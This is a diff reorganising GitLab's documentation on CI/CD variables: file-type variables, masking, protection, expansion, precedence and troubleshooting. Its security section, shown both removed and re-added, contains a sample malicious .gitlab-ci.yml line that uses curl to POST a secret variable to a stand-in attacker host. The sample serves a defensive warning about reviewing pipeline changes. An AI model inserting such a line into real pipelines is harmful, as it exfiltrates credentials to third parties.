@@ -34,62 +34,6 @@ Make sure each variable is defined for the [scope you want to use it in](where_v
 > - <i class="fa fa-youtube-play youtube" aria-hidden="true"></i>&nbsp;Learn how the Cloud Native Computing Foundation (CNCF) [eliminates the complexity](https://about.gitlab.com/customers/cncf/)
 >   of managing projects across many cloud providers with GitLab CI/CD.
 
-## CI/CD variable types
-
-All predefined CI/CD variables and variables defined in the `.gitlab-ci.yml` file
-are `Variable` type. Project, group and instance CI/CD variables can be `Variable`
-or `File` type.
-
-`Variable` type variables:
-
-- Consist of a key and value pair.
-- Are made available in jobs as environment variables, with:
-  - The CI/CD variable key as the environment variable name.
-  - The CI/CD variable value as the environment variable value.
-
-Use `File` type CI/CD variables for tools that need a file as input.
-
-`File` type variables:
-
-- Consist of a key, value and file.
-- Are made available in jobs as environment variables, with
-  - The CI/CD variable key as the environment variable name.
-  - The CI/CD variable value saved to a temporary file.
-  - The path to the temporary file as the environment variable value.
-
-Some tools like [the AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html)
-and [`kubectl`](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/#the-kubeconfig-environment-variable)
-use `File` type variables for configuration.
-
-For example, if you have the following variables:
-
-- A variable of type `Variable`: `KUBE_URL` with the value `https://example.com`.
-- A variable of type `File`: `KUBE_CA_PEM` with a certificate as the value.
-
-Use the variables in a job script like this:
-
-```shell
-kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
-```
-
-WARNING:
-Be careful when assigning the value of a file variable to another variable. The other
-variable takes the content of the file as its value, **not** the path to the file.
-See [issue 29407](https://gitlab.com/gitlab-org/gitlab/-/issues/29407) for more details.
-
-An alternative to `File` type variables is to:
-
-- Read the value of a CI/CD variable (`variable` type).
-- Save the value in a file.
-- Use that file in your script.
-
-```shell
-# Read certificate stored in $KUBE_CA_PEM variable and save it in a new file
-echo "$KUBE_CA_PEM" > "$(pwd)/kube.ca.pem"
-# Pass the newly created file to kubectl
-kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$(pwd)/kube.ca.pem"
-```
-
 ## Predefined CI/CD variables
 
 GitLab CI/CD makes a set of [predefined CI/CD variables](predefined_variables.md)
@@ -186,8 +130,8 @@ To add or update variables in the project settings:
 
    - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
    - **Value**: No limitations.
-   - **Type**: [`File` or `Variable`](#cicd-variable-types).
-   - **Environment scope**: Optional. `All`, or specific [environments](../environments/index.md).
+   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
+   - **Environment scope**: Optional. `All`, or specific [environments](../environments/index.md#limit-the-environment-scope-of-a-cicd-variable).
    - **Protect variable** Optional. If selected, the variable is only available
      in pipelines that run on [protected branches](../../user/project/protected_branches.md) or [protected tags](../../user/project/protected_tags.md).
    - **Mask variable** Optional. If selected, the variable's **Value** is masked
@@ -217,8 +161,8 @@ To add a group variable:
 
    - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
    - **Value**: No limitations.
-   - **Type**: [`File` or `Variable`](#cicd-variable-types).
-   - **Environment scope** Optional. `All`, or specific [environments](#limit-the-environment-scope-of-a-cicd-variable). **(PREMIUM)**
+   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
+   - **Environment scope** Optional. `All`, or specific [environments](../environments/index.md#limit-the-environment-scope-of-a-cicd-variable). **(PREMIUM)**
    - **Protect variable** Optional. If selected, the variable is only available
      in pipelines that run on protected branches or tags.
    - **Mask variable** Optional. If selected, the variable's **Value** is masked
@@ -249,7 +193,7 @@ To add an instance variable:
    - **Value**: In [GitLab 13.3 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/220028),
      the value is limited to 10,000 characters, but also bounded by any limits in the
      runner's operating system. In GitLab 13.0 to 13.2, the value is limited to 700 characters.
-   - **Type**: [`File` or `Variable`](#cicd-variable-types).
+   - **Type**: `Variable` (default) or [`File`](#use-file-type-cicd-variables).
    - **Protect variable** Optional. If selected, the variable is only available
      in pipelines that run on protected branches or tags.
    - **Mask variable** Optional. If selected, the variable's **Value** is not shown
@@ -257,6 +201,32 @@ To add an instance variable:
 
 The instance variables that are available in a project are listed in the project's
 **Settings > CI/CD > Variables** section.
+
+## CI/CD variable security
+
+Malicious code pushed to your `.gitlab-ci.yml` file could compromise your variables
+and send them to a third party server regardless of the masked setting. If the pipeline
+runs on a [protected branch](../../user/project/protected_branches.md) or
+[protected tag](../../user/project/protected_tags.md), malicious code can compromise protected variables.
+
+Review all merge requests that introduce changes to the `.gitlab-ci.yml` file before you:
+
+- [Run a pipeline in the parent project for a merge request submitted from a forked project](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project).
+- Merge the changes.
+
+Review the `.gitlab-ci.yml` file of imported projects before you add files or run pipelines against them.
+
+The following example shows malicious code in a `.gitlab-ci.yml` file:
+
+```yaml
+build:
+  script:
+    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
+```
+
+Variable values are encrypted using [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
+and stored in the database. This data can only be read and decrypted with a
+valid [secrets file](../../raketasks/backup_restore.md#when-the-secrets-file-is-lost).
 
 ### Mask a CI/CD variable
 
@@ -286,7 +256,7 @@ WARNING:
 Masking a CI/CD variable is not a guaranteed way to prevent malicious users from
 accessing variable values. The masking feature is "best-effort" and there to
 help when a variable is accidentally revealed. To make variables more secure,
-consider using [external secrets](../secrets/index.md) and [file type variables](#cicd-variable-types)
+consider using [external secrets](../secrets/index.md) and [file type variables](#use-file-type-cicd-variables)
 to prevent commands such as `env`/`printenv` from printing secret variables.
 
 Runner versions implement masking in different ways, some with technical
@@ -298,7 +268,7 @@ limitations. Below is a table of such limitations.
 | v14.2.0      | v15.3.0    | The tail of a large secret (greater than 4 KiB) could potentially be [revealed](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/28128). No sensitive URL parameter masking. |
 | v15.7.0      |            | Potential for secrets to be revealed when `CI_DEBUG_SERVICES` is enabled. For details, read about [service container logging](../services/index.md#capturing-service-container-logs). |
 
-### Protected CI/CD variables
+### Protect a CI/CD variable
 
 You can configure a project, group, or instance CI/CD variable to be available
 only to pipelines that run on [protected branches](../../user/project/protected_branches.md)
@@ -320,34 +290,61 @@ To mark a variable as protected:
 
 The variable is available for all subsequent pipelines.
 
-### Expand CI/CD variables
+### Use file type CI/CD variables
 
-> [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/217309) in GitLab 15.7.
+All predefined CI/CD variables and variables defined in the `.gitlab-ci.yml` file
+are `Variable` type. Project, group and instance CI/CD variables can be `Variable`
+or `File` type.
 
-Expanded variables treat values with the `$` character as a reference to another variable. CI/CD variables are expanded
-by default.
+`Variable` type variables:
 
-To treat variables with a `$` character as raw strings, disable variable expansion for the variable:
+- Consist of a key and value pair.
+- Are made available in jobs as environment variables, with:
+  - The CI/CD variable key as the environment variable name.
+  - The CI/CD variable value as the environment variable value.
 
-1. In the project or group, go to **Settings > CI/CD**.
-1. Expand the **Variables** section.
-1. Next to the variable you want to do not want expanded, select **Edit**.
-1. Clear the **Expand variable** checkbox.
-1. Select **Update variable**.
+Use `File` type CI/CD variables for tools that need a file as input.
 
-### Custom variables validated by GitLab
+`File` type variables:
 
-Some variables are listed in the UI so you can choose them more quickly.
+- Consist of a key, value and file.
+- Are made available in jobs as environment variables, with
+  - The CI/CD variable key as the environment variable name.
+  - The CI/CD variable value saved to a temporary file.
+  - The path to the temporary file as the environment variable value.
 
-| Variable                | Allowed Values                                     | Introduced in |
-|-------------------------|----------------------------------------------------|---------------|
-| `AWS_ACCESS_KEY_ID`     | Any                                                | 12.10         |
-| `AWS_DEFAULT_REGION`    | Any                                                | 12.10         |
-| `AWS_SECRET_ACCESS_KEY` | Any                                                | 12.10         |
+Some tools like [the AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html)
+and [`kubectl`](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/#the-kubeconfig-environment-variable)
+use `File` type variables for configuration.
+
+For example, if you have the following variables:
+
+- A variable of type `Variable`: `KUBE_URL` with the value `https://example.com`.
+- A variable of type `File`: `KUBE_CA_PEM` with a certificate as the value.
+
+Use the variables in a job script like this:
+
+```shell
+kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
+```
 
 WARNING:
-When you store credentials, there are [security implications](#cicd-variable-security).
-If you use AWS keys for example, follow the [Best practices for managing AWS access keys](https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html).
+Be careful when assigning the value of a file variable to another variable. The other
+variable takes the content of the file as its value, **not** the path to the file.
+See [issue 29407](https://gitlab.com/gitlab-org/gitlab/-/issues/29407) for more details.
+
+An alternative to `File` type variables is to:
+
+- Read the value of a CI/CD variable (`variable` type).
+- Save the value in a file.
+- Use that file in your script.
+
+```shell
+# Read certificate stored in $KUBE_CA_PEM variable and save it in a new file
+echo "$KUBE_CA_PEM" > "$(pwd)/kube.ca.pem"
+# Pass the newly created file to kubectl
+kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$(pwd)/kube.ca.pem"
+```
 
 ## Use CI/CD variables in job scripts
 
@@ -425,7 +422,7 @@ they can be used in job scripts.
    - Each defined line must be of the form `VARIABLE_NAME=ANY VALUE HERE`.
    - Values can be wrapped in quotes, but cannot contain newline characters.
 1. Save the `.env` file as an [`artifacts:reports:dotenv`](../yaml/artifacts_reports.md#artifactsreportsdotenv)
-artifact.
+   artifact.
 1. Jobs in later stages can then [use the variable in scripts](#use-cicd-variables-in-job-scripts).
 
 Inherited variables [take precedence](#cicd-variable-precedence) over
@@ -540,7 +537,7 @@ job1:
         done
 ```
 
-### Use variables in other variables
+## Use CI/CD variables in other variables
 
 You can use variables inside other variables:
 
@@ -553,7 +550,7 @@ job:
     - 'eval "$LS_CMD"'  # Executes 'ls -al'
 ```
 
-#### Use the `$` character in variables
+### Use the `$` character in CI/CD variables
 
 If you do not want the `$` character interpreted as the start of a variable, use `$$` instead:
 
@@ -566,31 +563,20 @@ job:
     - 'eval "$LS_CMD"'  # Executes 'ls -al $TMP_DIR'
 ```
 
-## CI/CD variable security
+### Prevent CI/CD variable expansion
 
-Malicious code pushed to your `.gitlab-ci.yml` file could compromise your variables
-and send them to a third party server regardless of the masked setting. If the pipeline
-runs on a [protected branch](../../user/project/protected_branches.md) or
-[protected tag](../../user/project/protected_tags.md), malicious code can compromise protected variables.
+> [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/217309) in GitLab 15.7.
 
-Review all merge requests that introduce changes to the `.gitlab-ci.yml` file before you:
+Expanded variables treat values with the `$` character as a reference to another variable.
+CI/CD variables are expanded by default.
 
-- [Run a pipeline in the parent project for a merge request submitted from a forked project](../pipelines/merge_request_pipelines.md#run-pipelines-in-the-parent-project).
-- Merge the changes.
+To treat variables with a `$` character as raw strings, disable variable expansion for the variable:
 
-Review the `.gitlab-ci.yml` file of imported projects before you add files or run pipelines against them.
-
-The following example shows malicious code in a `.gitlab-ci.yml` file:
-
-```yaml
-build:
-  script:
-    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
-```
-
-Variable values are encrypted using [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
-and stored in the database. This data can only be read and decrypted with a
-valid [secrets file](../../raketasks/backup_restore.md#when-the-secrets-file-is-lost).
+1. In the project or group, go to **Settings > CI/CD**.
+1. Expand the **Variables** section.
+1. Next to the variable you want to do not want expanded, select **Edit**.
+1. Clear the **Expand variable** checkbox.
+1. Select **Update variable**.
 
 ## CI/CD variable precedence
 
@@ -614,7 +600,7 @@ The order of precedence for variables is (from highest to lowest):
 1. [Inherited variables](#pass-an-environment-variable-to-another-job).
 1. Variables defined in jobs in the `.gitlab-ci.yml` file.
 1. Variables defined outside of jobs (globally) in the `.gitlab-ci.yml` file.
-1. [Deployment variables](#deployment-variables).
+1. [Deployment variables](predefined_variables.md#deployment-variables).
 1. [Predefined variables](predefined_variables.md).
 
 In the following example, when the script in `job1` executes, the value of `API_TOKEN` is `secure`.
@@ -672,46 +658,27 @@ use this setting for control over the environment the pipeline runs in.
 You can enable this feature by using [the projects API](../../api/projects.md#edit-project)
 to enable the `restrict_user_defined_variables` setting. The setting is `disabled` by default.
 
-## Limit the environment scope of a CI/CD variable
+## Related topics
 
-By default, all CI/CD variables are available to any job in a pipeline. Therefore, if a project uses a
-compromised tool in a test job, it could expose all CI/CD variables that a deployment job used. This is
-a common scenario in supply chain attacks. GitLab helps mitigate supply chain attacks by limiting
-the environment scope of a variable. GitLab does this by
-[defining which environments and corresponding jobs](../environments/index.md)
-the variable can be available for.
+- You can configure [Auto DevOps](../../topics/autodevops/index.md) to pass CI/CD variables
+  to a running application. To make a CI/CD variable available as an environment variable in the running application's container,
+  [prefix the variable key](../../topics/autodevops/cicd_variables.md#configure-application-secret-variables)
+  with `K8S_SECRET_`.
 
-To learn more about scoping environments, see [Scoping environments with specs](../environments/index.md#scope-environments-with-specs).
+- The [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck)
+  video is a walkthrough of the [Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo)
+  working example project. It explains how multiple levels of group CI/CD variables
+  can be combined with environment-scoped project variables for complex configuration
+  of application builds or deployments.
 
-To learn more about ensuring CI/CD variables are only exposed in pipelines running from protected
-branches or tags, see [Protected CI/CD variables](#protected-cicd-variables).
+  The example can be copied to your own group or instance for testing. More details
+  on what other GitLab CI patterns are demonstrated are available at the project page.
 
-## Deployment variables
+## Troubleshooting
 
-Integrations that are responsible for deployment configuration can define their own
-variables that are set in the build environment. These variables are only defined
-for [deployment jobs](../environments/index.md).
+### List all variables
 
-For example, the [Kubernetes integration](../../user/project/clusters/deploy_to_cluster.md#deployment-variables)
-defines deployment variables that you can use with the integration.
-
-The [documentation for each integration](../../user/project/integrations/index.md)
-explains if the integration has any deployment variables available.
-
-## Auto DevOps environment variables
-
-You can configure [Auto DevOps](../../topics/autodevops/index.md) to pass CI/CD variables
-to a running application.
-
-To make a CI/CD variable available as an environment variable in the running application's container,
-[prefix the variable key](../../topics/autodevops/cicd_variables.md#configure-application-secret-variables)
-with `K8S_SECRET_`.
-
-CI/CD variables with multi-line values are not supported.
-
-## List all environment variables
-
-You can list all environment variables available to a script with the `export` command
+You can list all variables available to a script with the `export` command
 in Bash or `dir env:` in PowerShell. This exposes the values of **all** available
 variables, which can be a [security risk](#cicd-variable-security).
 [Masked variables](#mask-a-cicd-variable) display as `[masked]`.
@@ -847,7 +814,7 @@ if [[ -d "/builds/gitlab-examples/ci-debug-trace/.git" ]]; then
 ...
 ```
 
-### Restrict access to debug logging
+#### Restrict access to debug logging
 
 > - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/213159) in GitLab 13.7.
 > - [Feature flag removed](https://gitlab.com/gitlab-org/gitlab/-/issues/292661) in GitLab 13.8.
@@ -863,14 +830,3 @@ WARNING:
 If you add `CI_DEBUG_TRACE` as a local variable to runners, debug logs generate and are visible
 to all users with access to job logs. The permission levels are not checked by the runner,
 so you should only use the variable in GitLab itself.
-
-## Video walkthrough of a working example
-
-The [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck)
-video is a walkthrough of the [Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo)
-working example project. It explains how multiple levels of group CI/CD variables
-can be combined with environment-scoped project variables for complex configuration
-of application builds or deployments.
-
-The example can be copied to your own group or instance for testing. More details
-on what other GitLab CI patterns are demonstrated are available at the project page.
